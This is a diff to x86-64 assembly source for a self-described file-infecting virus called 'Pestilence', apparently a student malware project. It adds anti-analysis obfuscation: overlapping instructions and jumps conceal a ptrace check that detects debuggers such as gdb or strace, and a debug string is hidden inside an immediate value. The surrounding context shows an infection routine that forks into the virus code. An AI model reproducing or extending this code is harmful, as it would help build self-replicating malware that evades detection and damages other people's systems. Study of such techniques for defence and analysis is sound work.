@@ -37,30 +37,33 @@ _start:
 	call _inject; push addr to stack
 
 signature db `Pestilence version 1.0 (c)oded by lmartin`, 0x0; sw4g signature
-debug_msg db `DEBUGGING..\n`, 0x0; sw4g signature
 
 _inject:
 	pop r8; pop addr from stack
 	sub r8, 0x5; sub call instr
 	; r8 contains the entry of the virus (for infected file cpy)
 
+	; --- START OF HELL
 	; THIS PART IS BLACK MAGIC, DON'T EDIT IT
+	; I'm kidding it's overlapping instruction and jmp
+	; http://infoscience.epfl.ch/record/167546/files/thesis.pdf
 	; Basically it ptrace(0, 0, 0 ,0) to check if something is tracing the
 	; binary (gdb, strace, ...), and then it select host or not launching
 	jmp $+4; -- skip mov rax
-	mov rax, 0x02ebf63148ff3148; xor rdi, rdi; xor rsi, rsi; jmp $+4
+	mov rdi, 0x02ebf63148ff3148; xor rdi, rdi; xor rsi, rsi; jmp $+4
 ;   -- has to skip 2 byte of instruction next line
-	mov rdx, 0x656ac93148d23148; xor rdx, rdx; xor rcx, rcx; push 101 -- ptrace
+	mov rsi, 0x656ac93148d23148; xor rdx, rdx; xor rcx, rcx; push 101 -- ptrace
 	pop rax
 	syscall
 
 	cmp rax, 0x0
-	jz $+46; has to jmp on [48 31 c0]
+	jz $+46; has to jmp on [48 31 c0] -> xor rax, rax
 
-	mov rdi, 2
-	lea rsi, [rel debug_msg]
-	mov rdx, 12
-	mov rax, 1
+	push 2
+	pop rdi
+	lea rsi, [rel .gandalf + 2]
+	jmp $+6
+	mov rax, 0x58016a5a0c6a3713; push 12; pop rdx; push 1; pop rax
 	syscall
 
 	; Wtf am I doing with my life
@@ -83,6 +86,7 @@ _inject:
 	jmp _exit
 
 	.infected:
+		; --- END OF HELL
 		mov rax, SYSCALL_FORK; fork
 		syscall
 
@@ -90,6 +94,9 @@ _inject:
 		jz .virus
 
 		jmp .prg
+		.gandalf:; 2 byte then [debug_msg db `DEBUGGING..\n`, 0x0]
+			mov rax, 0x4e49474755424544
+			db `G..\n`, 0x0
 		.virus:
 			push rdx
 			push r8
